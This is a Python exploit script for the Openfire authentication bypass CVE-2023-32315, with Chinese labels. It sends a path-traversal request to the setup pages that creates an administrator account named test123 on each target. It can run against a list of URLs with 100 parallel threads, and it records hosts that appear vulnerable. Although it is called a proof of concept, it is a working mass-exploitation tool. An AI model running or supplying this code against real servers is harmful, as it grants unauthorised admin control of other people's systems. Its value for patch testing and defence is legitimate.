import requests, sys, argparse, json, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                       
                                                                                                author:秋妤
                                                                                                date:2024.09.08
                                                                                                version:1.0 
"""
    print(test)


def main():
    banner()
    parse = argparse.ArgumentParser(description="Openfire身份认证绕过漏洞(CVE-2023-32315)")
    parse.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parse.add_argument('-f', '--file', dest='file', type=str, help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=test123&name=&email=&password=test123&passwordConfirm=test123&isadmin=on&create=Create+User"
    heasers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64;rv:102.0)Gecko/20100101Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Cookie': 'csrf=csrftoken',
    }
    try:
        res = requests.get(url=target + payload, headers=heasers, verify=False)
        if 'Expection' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('Openfile_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            return False
    except Exception as e:
        return False


if __name__ == "__main__":
    main()